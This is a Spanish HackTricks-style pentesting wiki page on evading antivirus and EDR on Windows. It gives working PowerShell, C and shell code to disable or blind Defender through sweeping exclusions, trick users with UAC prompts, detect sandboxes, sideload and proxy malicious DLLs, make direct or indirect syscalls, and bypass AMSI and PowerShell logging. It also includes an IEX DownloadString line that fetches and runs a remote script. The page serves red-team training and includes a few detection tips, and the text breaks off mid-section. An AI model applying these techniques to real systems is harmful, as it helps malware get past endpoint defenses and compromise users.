# Evasión del antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Esta página fue escrita originalmente por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Detener Defender

- [defendnot](https://github.com/es3n1n/defendnot): Una herramienta para impedir que Windows Defender funcione.
- [no-defender](https://github.com/es3n1n/no-defender): Una herramienta para impedir que Windows Defender funcione y hacerse pasar por otro antivirus.
- [Deshabilitar Defender si eres administrador](basic-powershell-for-pentesters/README.md)

### Señuelo de UAC al estilo de un instalador antes de manipular Defender

Los loaders públicos que se hacen pasar por cheats de juegos suelen distribuirse como instaladores de Node.js/Nexe sin firmar que primero **solicitan al usuario permisos elevados** y solo entonces neutralizan Defender. El flujo es sencillo:

1. Comprueban si el contexto tiene permisos administrativos con `net session`. El comando solo se ejecuta correctamente cuando quien lo invoca tiene permisos de administrador, así que un fallo indica que el loader se está ejecutando como usuario estándar.
2. Se vuelven a ejecutar inmediatamente con el verbo `RunAs` para mostrar el esperado aviso de consentimiento de UAC y conservar la línea de comandos original.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Las víctimas ya creen que están instalando software “cracked”, así que normalmente aceptan el aviso, lo que le da al malware los permisos que necesita para cambiar la política de Defender.<sup>[[26]](#references)</sup>

### Exclusiones generales de `MpPreference` para cada letra de unidad

Una vez elevados los privilegios, las cadenas al estilo GachiLoader maximizan los puntos ciegos de Defender en lugar de deshabilitar el servicio por completo. Primero, el loader termina el watchdog de la GUI (`taskkill /F /IM SecHealthUI.exe`) y luego aplica **exclusiones extremadamente amplias** para que no se puedan analizar todos los perfiles de usuario, directorios del sistema ni discos extraíbles:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Observaciones clave:

- El bucle recorre todos los sistemas de archivos montados (D:\, E:\, memorias USB, etc.), por lo que **se ignora cualquier payload futuro que se deje en cualquier ubicación del disco**.
- La exclusión de la extensión `.sys` está pensada para el futuro: los atacantes se reservan la opción de cargar drivers sin firmar más adelante sin volver a tocar Defender.
- Todos los cambios se realizan en `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, lo que permite a etapas posteriores confirmar que las exclusiones persisten o ampliarlas sin volver a activar UAC.

Como no se detiene ningún servicio de Defender, las comprobaciones de estado ingenuas siguen indicando que “el antivirus está activo”, aunque la inspección en tiempo real nunca analiza esas rutas.<sup>[[26]](#references)</sup>

## **Metodología de AV Evasion**

Actualmente, los AV usan distintos métodos para comprobar si un archivo es malicioso o no: detección estática, análisis dinámico y, en los EDR más avanzados, análisis de comportamiento.

### **Detección estática**

La detección estática se logra señalando cadenas maliciosas conocidas o secuencias de bytes en un binario o script, además de extraer información del propio archivo (p. ej., descripción del archivo, nombre de la empresa, firmas digitales, icono, checksum, etc.). Esto significa que usar herramientas públicas conocidas puede hacer que te detecten con más facilidad, ya que probablemente se hayan analizado y señalado como maliciosas. Hay varias formas de sortear este tipo de detección:

- **Encryption**

Si cifras el binario, el AV no podrá detectar tu programa, pero necesitarás algún tipo de loader para descifrarlo y ejecutar el programa en memoria.

- **Obfuscation**

A veces solo tienes que cambiar algunas cadenas de tu binario o script para que pase el AV, pero esto puede llevar mucho tiempo, según lo que intentes ofuscar.

- **Custom tooling**

Si desarrollas tus propias herramientas, no habrá firmas maliciosas conocidas, pero esto requiere mucho tiempo y esfuerzo.

> [!TIP]
> Una buena forma de comprobar la detección estática de Windows Defender es [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Básicamente, divide el archivo en varios segmentos y luego le pide a Defender que analice cada uno por separado; así, puede indicarte exactamente qué cadenas o bytes de tu binario han sido señalados.

Te recomiendo encarecidamente que consultes esta [playlist de YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion práctica.

### Pruebas offline de características PE para clasificadores estáticos

Los bytes de un payload empaquetado o cifrado son solo uno de los datos que utiliza un clasificador estático. EMBER2024 extrae características PE, incluidos imports, exports, secciones, headers y datos de Authenticode.<sup>[[48]](#references)</sup> En un experimento con un loader, añadir 141 imports de aspecto benigno redujo en un 93 % la puntuación de malware de EMBER2024, mientras que los imports asociados al malware la aumentaron. Este resultado corresponde a ese modelo y a esas muestras; no es un bypass fiable de un producto AV/EDR concreto.<sup>[[50]](#references)</sup>

Para una prueba autorizada de un loader, mantén constantes el payload y la ruta de ejecución, cambia una sola variable de build prevista por variante y compara las puntuaciones offline. Inspecciona las características PE resultantes, ya que un cambio de build puede afectar a más de un grupo de características.<sup>[[49]](#references)[[50]](#references)</sup> Para mantener los imports previstos en la IAT, llama a las APIs Win32 elegidas desde código alcanzable. Varía la selección y distribuye los puntos de llamada entre builds, en lugar de crear una función de camuflaje fija que pueda convertirse en una firma. El experimento también registró puntuaciones más bajas con firmas de código válidas, entradas de export y más funciones que amplían `.pdata`; las firmas inválidas tuvieron poco efecto y el efecto de `.pdata` fue pequeño.<sup>[[50]](#references)</sup>

El paquete `thrember` proporciona extracción de características y modelos de referencia. Después de instalarlo, usa `thrember.download_models("models")` con un directorio `models` existente y luego ejecuta el scorer desde su directorio padre: el helper de descarga cambia el directorio de trabajo actual. El clasificador PE puede puntuar un directorio de builds sin enviarlos a un servicio de análisis:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Mantén fijas las versiones del modelo y del extractor de características durante la comparación. Una puntuación offline más baja solo muestra cómo reacciona este clasificador ante el binario modificado; no demuestra la evasión del análisis de comportamiento, la emulación ni el modelo diferente de un proveedor.<sup>[[49]](#references)[[50]](#references)</sup> Para [polimorfismo por compilación y camuflaje del binario externo en payloads virtualizados](virtualized-payload-execution.md#camouflaging-the-outer-go-executable), consulta el modelo de ejecución independiente.

### **Análisis dinámico**

El análisis dinámico ocurre cuando el AV ejecuta tu binario en un sandbox y vigila si hay actividad maliciosa (p. ej., intentar descifrar y leer las contraseñas de tu navegador, realizar un minidump de LSASS, etc.). Esta parte puede ser algo más complicada, pero aquí tienes algunas cosas que puedes hacer para evadir sandboxes.

- **Esperar antes de la ejecución** Dependiendo de cómo se implemente, puede ser una excelente forma de evadir el análisis dinámico del AV. Los AV tienen muy poco tiempo para analizar archivos y no interrumpir el flujo de trabajo del usuario, así que las esperas largas pueden dificultar el análisis de los binarios. El problema es que muchos sandboxes de AV pueden simplemente saltarse la espera, dependiendo de cómo se implemente.
- **Comprobar los recursos de la máquina** Por lo general, los sandboxes disponen de muy pocos recursos (p. ej., < 2GB de RAM); de lo contrario, podrían ralentizar la máquina del usuario. También puedes ser muy creativo; por ejemplo, puedes comprobar la temperatura de la CPU o incluso la velocidad de los ventiladores, ya que no todo estará implementado en el sandbox.
- **Comprobaciones específicas de la máquina** Si quieres dirigirte a un usuario cuya estación de trabajo está unida al dominio "contoso.local", puedes comprobar el dominio del equipo para ver si coincide con el que especificaste. Si no coincide, puedes hacer que tu programa se cierre.

Resulta que el nombre del equipo del sandbox de Microsoft Defender es HAL9TH. Así que puedes comprobar el nombre del equipo en tu malware antes de la detonación; si coincide con HAL9TH, significa que estás dentro del sandbox de Defender y puedes hacer que tu programa se cierre.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fuente: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Otros consejos muy buenos de [@mgeeky](https://twitter.com/mariuszbit) para enfrentarse a los sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como hemos dicho antes en esta publicación, las **herramientas públicas** tarde o temprano **serán detectadas**, así que deberías preguntarte algo:

Por ejemplo, si quieres volcar LSASS, **¿realmente necesitas usar mimikatz**? ¿O podrías usar otro proyecto menos conocido que también vuelque LSASS?

Probablemente, la respuesta correcta sea la segunda opción. Tomemos mimikatz como ejemplo: probablemente sea una de las muestras de malware más detectadas por los AV y los EDR, si no la que más. Aunque el proyecto en sí es muy interesante, también es una pesadilla trabajar con él para evadir los AV, así que busca alternativas para lo que intentas conseguir.

> [!TIP]
> Cuando modifiques tus payloads para evadir la detección, asegúrate de **desactivar el envío automático de muestras** en Defender y, en serio, **NO LO SUBAS A VIRUSTOTAL** si tu objetivo es lograr la evasión a largo plazo. Si quieres comprobar si un AV concreto detecta tu payload, instálalo en una VM, intenta desactivar el envío automático de muestras y pruébalo allí hasta que estés conforme con el resultado.

## EXE frente a DLL

Siempre que sea posible, **prioriza el uso de DLL para la evasión**. Según mi experiencia, los archivos DLL suelen detectarse y analizarse **mucho menos**, así que es un truco muy sencillo para evitar la detección en algunos casos (si tu payload puede ejecutarse como DLL, claro).

Como podemos ver en esta imagen, un payload DLL de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que el payload EXE tiene una tasa de detección de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparación en antiscan.me de un payload EXE normal de Havoc con una DLL normal de Havoc</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más sigiloso.

## DLL Sideloading & Proxying

**DLL Sideloading** aprovecha el orden de búsqueda de DLL que utiliza el loader, colocando la aplicación víctima y el payload malicioso junto a ella.

Puedes buscar programas susceptibles a DLL Sideloading con [Siofra](https://github.com/Cybereason/siofra) y el siguiente script de powershell:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Este comando mostrará la lista de programas susceptibles a DLL hijacking dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Te recomiendo encarecidamente que **explores por tu cuenta los programas vulnerables a DLL Hijack/Sideload**. Esta técnica es bastante sigilosa si se realiza correctamente, pero si usas programas DLL Sideload conocidos públicamente, podrían detectarte fácilmente.

El simple hecho de colocar una DLL maliciosa con el nombre de una DLL que un programa espera cargar no hará que cargue tu payload, ya que el programa espera encontrar funciones específicas dentro de esa DLL. Para solucionar este problema, usaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** reenvía a la DLL original las llamadas que un programa hace a través de la DLL proxy (y maliciosa). Así se conserva la funcionalidad del programa y se puede ejecutar tu payload.

Usaré el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/).

Estos son los pasos que seguí:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

El último comando nos dará 2 archivos: una plantilla de código fuente de DLL y la DLL original renombrada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Estos son los resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

¡Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como la proxy DLL tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me)! Yo diría que fue un éxito.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Te **recomiendo encarecidamente** que veas el VOD de Twitch de [S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading, así como el [video de ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), para aprender más a fondo sobre lo que hemos tratado.

### Abuso de exports reenviados (ForwardSideLoading)

Los módulos PE de Windows pueden exportar funciones que en realidad son «forwarders»: en lugar de apuntar a código, la entrada de exportación contiene una cadena ASCII con el formato `TargetDll.TargetFunc`. Cuando un caller resuelve la exportación, el loader de Windows:

- Carga `TargetDll` si aún no está cargada
- Resuelve `TargetFunc` desde ella

Comportamientos clave que debes comprender:
- Si `TargetDll` es una KnownDLL, se proporciona desde el espacio de nombres protegido KnownDLLs (por ejemplo, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Si `TargetDll` no es una KnownDLL, se usa el orden normal de búsqueda de DLL, que incluye el directorio del módulo que realiza la resolución del forward.

Esto permite una primitiva de sideloading indirecta: encuentra una DLL firmada que exporte una función reenviada a un nombre de módulo que no sea KnownDLL y, luego, coloca esa DLL firmada junto a una DLL controlada por el atacante cuyo nombre coincida exactamente con el módulo de destino reenviado. Cuando se invoca la exportación reenviada, el loader resuelve el forward y carga tu DLL desde el mismo directorio, ejecutando tu DllMain.<sup>[[13]](#references)</sup>

Ejemplo observado en Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` no es una KnownDLL, por lo que se resuelve según el orden de búsqueda normal.

PoC (copiar y pegar):
1) Copia la DLL firmada del sistema a una carpeta con permisos de escritura
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloca un `NCRYPTPROV.dll` malicioso en la misma carpeta. Un `DllMain` mínimo basta para ejecutar código; no necesitas implementar la función reenviada para activar `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Inicia el reenvío con un LOLBin firmado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (signed) carga el `keyiso.dll` side-by-side (signed)
- Al resolver `KeyIsoSetAuditingInterface`, el loader sigue el forward a `NCRYPTPROV.SetAuditingInterface`
- A continuación, el loader carga `NCRYPTPROV.dll` desde `C:\test` y ejecuta su `DllMain`
- Si `SetAuditingInterface` no está implementada, se produce un error "missing API" solo después de que `DllMain` ya se haya ejecutado

Hunting tips:
- Céntrate en los exports forwardeados cuyo módulo de destino no sea un KnownDLL. Los KnownDLLs aparecen en `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Puedes enumerar exports forwardeados con herramientas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulta el inventario de forwarders de Windows 11 para buscar candidatos: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideas de detección/defensa:
- Supervisa los LOLBins (p. ej., rundll32.exe) que carguen DLL firmadas desde rutas ajenas al sistema, seguidas de la carga de DLL que no sean KnownDLLs y tengan el mismo nombre base desde ese directorio
- Genera alertas para cadenas de procesos/módulos como: `rundll32.exe` → `keyiso.dll` ajena al sistema → `NCRYPTPROV.dll` en rutas con permisos de escritura para usuarios
- Aplica políticas de integridad de código (WDAC/AppLocker) y deniega permisos de escritura y ejecución en directorios de aplicaciones

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze es un toolkit de payloads para evadir EDR mediante procesos suspendidos, syscalls directas y métodos de ejecución alternativos`

Puedes usar Freeze para cargar y ejecutar tu shellcode de forma sigilosa.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> La evasión es un juego del gato y el ratón: lo que funciona hoy puede detectarse mañana, así que nunca dependas de una sola herramienta y, si es posible, prueba a encadenar varias técnicas de evasión.

## Syscalls directos/indirectos y resolución de SSN (SysWhispers4)

Los EDR suelen colocar **hooks inline en modo usuario** en los stubs de syscall de `ntdll.dll`. Para eludir esos hooks, puedes generar stubs de syscall **directos** o **indirectos** que carguen el **SSN** (System Service Number) correcto y pasen al modo kernel sin ejecutar el punto de entrada exportado con hooks.<sup>[[32]](#references)</sup>

**Opciones de invocación:**
- **Directa (integrada)**: emite una instrucción `syscall`/`sysenter`/`SVC #0` en el stub generado (sin acceder a una exportación de `ntdll`).
- **Indirecta**: salta a un gadget `syscall` existente dentro de `ntdll` para que la transición al kernel parezca originarse en `ntdll` (útil para evadir heurísticas); la opción **indirecta aleatoria** elige un gadget de un conjunto en cada llamada.
- **Egg-hunt**: evita integrar en disco la secuencia estática de opcode `0F 05`; resuelve una secuencia de syscall durante la ejecución.

**Estrategias de resolución de SSN resistentes a hooks:**
- **FreshyCalls (VA sort)**: infiere los SSN ordenando los stubs de syscall por dirección virtual, en lugar de leer los bytes de los stubs.
- **SyscallsFromDisk**: mapea un `\KnownDlls\ntdll.dll` limpio, lee los SSN de su sección `.text` y luego lo desmapea (elude todos los hooks en memoria).
- **RecycledGate**: combina la inferencia de SSN mediante ordenamiento por VA con la validación de opcodes cuando un stub está limpio; recurre a la inferencia por VA si tiene hooks.
- **HW Breakpoint**: establece DR0 en la instrucción `syscall` y usa un VEH para capturar el SSN de `EAX` durante la ejecución, sin analizar bytes con hooks.

Ejemplo de uso de SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI se creó para prevenir el "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Al principio, los AV solo podían analizar **archivos en disco**, así que, si de alguna manera podías ejecutar payloads **directamente en memoria**, el AV no podía hacer nada para impedirlo, ya que no tenía suficiente visibilidad.

La función AMSI está integrada en estos componentes de Windows.

- Control de cuentas de usuario, o UAC (elevación de EXE, COM, MSI o instalación de ActiveX)
- PowerShell (scripts, uso interactivo y evaluación dinámica de código)
- Windows Script Host (wscript.exe y cscript.exe)
- JavaScript y VBScript
- Macros de Office VBA

Permite que las soluciones antivirus inspeccionen el comportamiento de los scripts al exponer su contenido en un formato sin cifrar ni ofuscar.

Ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` generará la siguiente alerta en Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observa cómo antepone `amsi:` y luego la ruta al ejecutable desde el que se ejecutó el script; en este caso, powershell.exe

No guardamos ningún archivo en el disco, pero aun así nos detectó en memoria debido a AMSI.

Además, a partir de **.NET 4.8**, el código C# también se ejecuta a través de AMSI. Esto incluso afecta a `Assembly.Load(byte[])` para cargar código y ejecutarlo en memoria. Por eso se recomienda usar versiones anteriores de .NET (como la 4.7.2 o anteriores) para ejecutar código en memoria si quieres evadir AMSI.

Hay un par de formas de evadir AMSI:

- **Ofuscación**

Como AMSI se basa principalmente en detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena forma de evadir la detección.

Sin embargo, AMSI puede desofuscar scripts incluso si tienen varias capas, por lo que la ofuscación podría ser una mala opción, según cómo se realice. Esto hace que evadirla no sea tan sencillo. Aunque a veces basta con cambiar un par de nombres de variables, así que depende de cuánto se haya marcado algo.

- **AMSI Bypass**

Como AMSI se implementa cargando una DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible manipularla fácilmente, incluso como usuario sin privilegios. Debido a esta falla en la implementación de AMSI, los investigadores han encontrado varias formas de evadir su análisis.

**Forzar un error**

Forzar que la inicialización de AMSI falle (amsiInitFailed) hará que no se inicie ningún análisis para el proceso actual. Esto fue divulgado originalmente por [Matt Graeber](https://twitter.com/mattifestation), y Microsoft desarrolló una firma para evitar que se usara de forma generalizada.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bastó una sola línea de código de PowerShell para dejar AMSI inutilizable en el proceso actual de PowerShell. Por supuesto, AMSI ha detectado esta línea, así que es necesario modificarla para poder usar esta técnica.

Aquí tienes un bypass de AMSI modificado que tomé de este [Gist de Github](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Keep in mind that probablemente esto se marcará cuando se publique esta entrada, así que no deberías publicar ningún código si tu plan es pasar desapercibido.

**Memory Patching**

Esta técnica fue descubierta inicialmente por [@RastaMouse](https://twitter.com/_RastaMouse/) y consiste en encontrar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de analizar la entrada proporcionada por el usuario) y sobrescribirla con instrucciones para que devuelva el código E_INVALIDARG. De esta forma, el resultado del análisis real será 0, que se interpreta como un resultado limpio.

> [!TIP]
> Lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para obtener una explicación más detallada.

También hay muchas otras técnicas para evadir AMSI con powershell. Consulta [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) y [**este repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para obtener más información.

### Redirección del puntero de análisis COM de AMSI en lugar de parchear `AmsiScanBuffer`

Otro bypass local al proceso deja intacto el punto de entrada de `AmsiScanBuffer`. En el loader .NET de 64 bits descrito, se crea un objeto COM de AMSI a partir del CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` devuelve el puntero de la interfaz y se utiliza su entrada de vtable en el desplazamiento `0x18` como destino de la llamada de análisis. El loader parchea un puntero nativo de `Console.Clear()` con un pequeño stub x64, cambia esa entrada de vtable para que apunte al stub mediante `VirtualProtect()` y, luego, restaura la protección original de la página. Tanto el ancho de puntero de 64 bits como el diseño COM esperado son requisitos; este no es un desplazamiento genérico válido para interfaces o versiones arbitrarias de AMSI. Las etapas observadas anteriormente son [la carga de un sidecar firmado de AppDomainManager](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) y [la deserialización de RESX](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Los bytes observados del stub son `41 C7 00 01 00 00 00 33 C0 C3`: escriben **1** en el puntero de resultado en `r8` y devuelven **0** en `eax`. Por lo tanto, la afirmación descrita de que el resultado del análisis es `AMSI_RESULT_CLEAN` (0) confunde el valor de retorno `S_OK` con el enum de salida. En el orden documentado de `AMSI_RESULT`, el resultado **1** es `AMSI_RESULT_NOT_DETECTED`; aun así, está por debajo del umbral de detección.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Bloqueo de AMSI al impedir la carga de amsi.dll (hook de LdrLoadDll)

AMSI se inicializa solo después de que `amsi.dll` se carga en el proceso actual. Un bypass robusto e independiente del lenguaje consiste en instalar un hook en modo usuario en `ntdll!LdrLoadDll` que devuelva un error cuando el módulo solicitado sea `amsi.dll`. Como resultado, AMSI nunca se carga y no se realizan análisis en ese proceso.<sup>[[23]](#references)</sup>

Esquema de implementación (pseudocódigo x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona con PowerShell, WScript/CScript y loaders personalizados (cualquier cosa que, de otro modo, cargue AMSI).
- Combínalo con el envío de scripts mediante stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefactos largos en la línea de comandos.
- Se ha visto en uso por loaders ejecutados mediante LOLBins (p. ej., `regsvr32` que llama a `DllRegisterServer`).

La herramienta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** también genera scripts para omitir AMSI.
La herramienta **[https://amsibypass.com/](https://amsibypass.com/)** también genera scripts para omitir AMSI que evitan la detección por firmas mediante funciones definidas por el usuario aleatorizadas, variables y expresiones de caracteres, y aplica aleatoriamente mayúsculas y minúsculas a las palabras clave de PowerShell para evitar la detección por firmas.

**Eliminar la firma detectada**

Puedes usar herramientas como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** y **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para eliminar la firma de AMSI detectada de la memoria del proceso actual. Esta herramienta funciona buscando la firma de AMSI en la memoria del proceso actual y sobrescribiéndola con instrucciones NOP, eliminándola así de la memoria.

**Productos AV/EDR que usan AMSI**

Puedes encontrar una lista de productos AV/EDR que usan AMSI en **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Usar PowerShell versión 2**
Si usas PowerShell versión 2, AMSI no se cargará, así que podrás ejecutar tus scripts sin que AMSI los analice. Puedes hacer esto:

```bash
powershell.exe -version 2
```

## Registro de PS

El registro de PowerShell es una función que permite registrar todos los comandos de PowerShell ejecutados en un sistema. Esto puede ser útil para fines de auditoría y solución de problemas, pero también puede ser un **problema para los atacantes que quieren evadir la detección**.

Para evadir el registro de PowerShell, puedes usar las siguientes técnicas:

- **Desactivar PowerShell Transcription y Module Logging**: Puedes usar una herramienta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para este propósito.
- **Usar la versión 2 de PowerShell**: Si usas la versión 2 de PowerShell, AMSI no se cargará, por lo que podrás ejecutar tus scripts sin que AMSI los analice. Puedes hacerlo así: `powershell.exe -version 2`
- **Usar una sesión de PowerShell no administrada**: Usa [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para alojar PowerShell sin iniciar `powershell.exe` (el enfoque que usa `powerpick` de Cobalt Strike). Esto evade los controles vinculados específicamente al proceso `powershell.exe`, pero no desactiva por sí solo AMSI, Script Block Logging ni todas las demás defensas de PowerShell; la cobertura depende del runtime y de la implementación del host.


## Ofuscación

> [!TIP]
> Varias técnicas de ofuscación se basan en cifrar datos, lo que aumentará la entropía del binario y facilitará su detección por parte de los antivirus y los EDR. Ten cuidado con esto y, quizá, aplica el cifrado solo a secciones específicas de tu código que sean sensibles o deban ocultarse.

### Desofuscar binarios .NET protegidos con ConfuserEx

Al analizar malware que usa ConfuserEx 2 (o forks comerciales), es habitual encontrarse con varias capas de protección que bloquean los decompiladores y los sandboxes. El flujo de trabajo que se describe a continuación **restaura de forma fiable un IL casi original**, que después se puede decompilar a C# con herramientas como dnSpy o ILSpy.<sup>[[10]](#references)</sup>

1.  Eliminación de la protección contra manipulaciones: ConfuserEx cifra todos los *cuerpos de método* y los descifra dentro del constructor estático del *módulo* (`<Module>.cctor`). También modifica la suma de comprobación PE, de modo que cualquier cambio hará que el binario se bloquee. Usa **AntiTamperKiller** para localizar las tablas de metadatos cifradas, recuperar las claves XOR y reescribir un ensamblado limpio:
   ```bash
